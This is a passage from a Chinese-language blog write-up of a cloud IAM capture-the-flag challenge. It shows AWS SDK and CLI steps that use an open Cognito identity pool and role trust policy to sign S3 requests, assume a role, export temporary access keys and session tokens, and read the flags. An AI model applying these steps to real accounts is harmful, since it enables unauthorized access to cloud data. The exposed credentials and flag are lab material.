$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> s3 = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title function_">S3</span>();</span><br><span class="line">    params = &#123;</span><br><span class="line">      <span class="title class_">Bucket</span>: <span class="string">&#x27;wiz-privatefiles&#x27;</span>,</span><br><span class="line">      <span class="title class_">Key</span>: <span class="string">&#x27;cognito1.png&#x27;</span>,</span><br><span class="line">      <span class="title class_">Expires</span>: <span class="number">60</span> * <span class="number">60</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    signedUrl = s3.<span class="title function_">getSignedUrl</span>(<span class="string">&#x27;getObject&#x27;</span>, params, <span class="keyword">function</span> (<span class="params">err, url</span>) &#123;</span><br><span class="line">      $(<span class="string">&#x27;#signedImg&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>, url);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>我们先使用listObjects方法以同样的方式列举s3存储桶对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">region</span> = <span class="string">&#x27;us-east-1&#x27;</span>;</span><br><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span> = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title class_">CognitoIdentityCredentials</span>(&#123;<span class="title class_">IdentityPoolId</span>: <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// Set the region</span></span><br><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="title function_">update</span>(&#123;<span class="attr">region</span>: <span class="string">&#x27;us-east-1&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s3 = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title function_">S3</span>();</span><br><span class="line">params = &#123;</span><br><span class="line">  <span class="title class_">Bucket</span>: <span class="string">&#x27;wiz-privatefiles&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signedUrl = s3.<span class="title function_">getSignedUrl</span>(<span class="string">&#x27;listObjects&#x27;</span>, params, <span class="keyword">function</span> (<span class="params">err, url</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(url);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402140002248.png" alt="image-20240402140002248"></p>
<p>访问链接可查看详细对象信息</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402140117462.png" alt="image-20240402140117462"></p>
<p>利用getobject方法获取flag1.txt内容</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">region</span> = <span class="string">&#x27;us-east-1&#x27;</span>;</span><br><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span> = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title class_">CognitoIdentityCredentials</span>(&#123;<span class="title class_">IdentityPoolId</span>: <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// Set the region</span></span><br><span class="line"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="title function_">update</span>(&#123;<span class="attr">region</span>: <span class="string">&#x27;us-east-1&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s3 = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title function_">S3</span>();</span><br><span class="line">params = &#123;</span><br><span class="line">  <span class="title class_">Bucket</span>: <span class="string">&#x27;wiz-privatefiles&#x27;</span>,</span><br><span class="line">  <span class="title class_">Key</span>: <span class="string">&#x27;flag1.txt&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signedUrl = s3.<span class="title function_">getSignedUrl</span>(<span class="string">&#x27;getObject&#x27;</span>, params, <span class="keyword">function</span> (<span class="params">err, url</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(url);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402141142564.png" alt="image-20240402141142564"></p>
<p>访问链接获取flag1.txt内容</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402141227400.png" alt="image-20240402141227400"></p>
<h2 id="6-第六部分"><a href="#6-第六部分" class="headerlink" title="6. 第六部分"></a>6. 第六部分</h2><h3 id="One-final-push-最终推送"><a href="#One-final-push-最终推送" class="headerlink" title="One final push  最终推送"></a>One final push  最终推送</h3><p>Anonymous access no more. Let’s see what can you do now.</p>
<p>Now try it with the authenticated role: arn:aws:iam::092297851374:role&#x2F;Cognito_s3accessAuth_Role</p>
<h4 id="1-1-我们查看拥有的权限-5"><a href="#1-1-我们查看拥有的权限-5" class="headerlink" title="1.1 我们查看拥有的权限"></a>1.1 我们查看拥有的权限</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;Federated&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cognito-identity.amazonaws.com&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;cognito-identity.amazonaws.com:aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>sts:AssumeRoleWithWebIdentity</code> 是 AWS Security Token Service (STS) 中的一种操作，用于通过 Web 身份验证（如 OpenID Connect 或者 AWS Cognito）获取角色的临时安全凭证。这个操作允许基于经过身份验证的 Web 用户身份来假定指定的 IAM 角色，并获取一个临时的安全凭证，以便在一段时间内访问 AWS 资源。</li>
<li>可以获取的信息还有我们的身份池地址：us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b</li>
</ul>
<h4 id="1-2-我们尝试进行sts身份认证获取凭证"><a href="#1-2-我们尝试进行sts身份认证获取凭证" class="headerlink" title="1.2 我们尝试进行sts身份认证获取凭证"></a>1.2 我们尝试进行sts身份认证获取凭证</h4><p>先尝试一下认证</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts assume-role-with-web-identity</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402142645204.png" alt="image-20240402142645204"></p>
<p>发现需要提供三个参数</p>
<ul>
<li><p>–role-arn arn:aws:iam::092297851374:role&#x2F;Cognito_s3accessAuth_Role（题目已给出）</p>
</li>
<li><p>–role-session-name</p>
<p>iam-final（任意值）</p>
</li>
<li><p>–web-identity-token</p>
<p>通过身份池地址进行获取身份id，然后获取token，前面的题目也有类似方法</p>
</li>
</ul>
<h4 id="1-3-获取token并进行sts认证"><a href="#1-3-获取token并进行sts认证" class="headerlink" title="1.3 获取token并进行sts认证"></a>1.3 获取token并进行sts认证</h4><p>获取身份id</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402145024182.png" alt="image-20240402145024182"></p>
<p>获取token</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-identity get-open-id-token --identity-id us-east-1:157d6171-eebb-c389-cc99-2f1643910337</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402145045191.png" alt="image-20240402145045191"></p>
<p>尝试sts认证获取凭据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name iam-final --web-identity-token eyJraWQiOiJ1cy1lYXN0LTE1IiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWUxYy1jZjVmLTAxODItNDhmYjcxOTk3NDkyIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3MTIwNDA5NDIsImlhdCI6MTcxMjA0MDM0Mn0.fvdf9FUyP_jX8FlAZmPecDP2b751Y8onuxM-oDttmiFhgfrEvmtTt2WMirYknUBcPyRbxvq65sHI8gVACaSBhdvXX-hFMsufHT-zvXuqknk-tw8iQbh5R6TiqIwALFw_XKI42MwtKEwM4_rIGuWi3NfUsvCTw2ozasNUH0yHVY4i7zoZrZjK6F8FouwkCISJXg3EpFaLLGbhGZvFWPo8zXve0e2b_jvov46je9s4Bcg9P1yizVZdxPoWit3hzIhZCqcCWucXQBcHQ92iV5utBDz8UuikdAI2WfInZyEOmnfI7tD9G2GUMtbVdZ9epnbbbxe9uOBLZtvSjW0vrIFqyg</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402145111698.png" alt="image-20240402145111698"></p>
<p>设置我们获取的凭据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export AWS_ACCESS_KEY_ID=ASIARK7LBOHXBDE2Z6T7</span><br><span class="line">export AWS_SECRET_ACCESS_KEY=9nIvs6cieraSGqKTmcVKtnRam3GqSXH7rZkV2ZOm</span><br><span class="line">export AWS_SESSION_TOKEN=FwoGZXIvYXdzEEAaDNcSynI3yxJRduYP0iKhAp42je5FxsoJHQ7s0eicfTkA24WP3xjJpsFuPWnDsTyACa8auN1wUApThySmgsCy3H90LwBHWI92YuIxE3notWVtsyB6dzjzceHi8U29DWeqz8Odgr5HPJGujN5v6ehyEhVcRGRXtLgVT2nLFxavSfhoO9ko3+MUS6eEUJLvPNZaKE9V6PgEsq4D6vcfixJ773hiY8U8XWEDKZ/hKIT+1P2YkPo2aZzzTCb8A4JHWurVCr8AgxFqZq7qwag7lT3xQdutXC15k+8/rwkcaF3gvOvL/ysG2Oa6EJivzKFhOSw3FOL6agKM9jv8ZjgkTlnUOJ/8eROARctlVeNJst5ZjVTeT3sWNlkQkY+mCKLoBC/jYGOhZlxfjs4rRzBXvLbln/Yo5dSusAYylgGoiwogzTBbK8wOe8OUbtdTzGH+TSB81vclAhwfzDJQbW8K6Q5daFjPk2j9IImpZAODGNDLZGRZScGsuaCj/Y+S4h5hPrGmkIBkjWdGVlmXGG/VWoVk94e7s0wbQmWOwhk0HZkMwk6THHo7lkQdXmChLLg4TpHngf3f1phWMVS77irKza0osUjIMkTd44aAWTacYaV1hvE=</span><br></pre></td></tr></table></figure>

<p>最终操作s3桶获取flag</p>
<p>{wiz:open-sesame-or-shell-i-say-openid}</p>
</p><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>Author: Sally</div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-04-02</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>About 2373 words, 7 min 54 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://phoenixmerk.github.io/2024/04/02/从IAM-CTF看云身份安全/,Sally's Blog,从IAM-CTF看云身份安全,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/03/31/CVE-2024-3094%20sshd-xz%E6%BC%8F%E6%B4%9E/" title="CVE-2024-3094 sshd-xz漏洞">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><script src="/js/baidu-tongji.js"></script></body></html>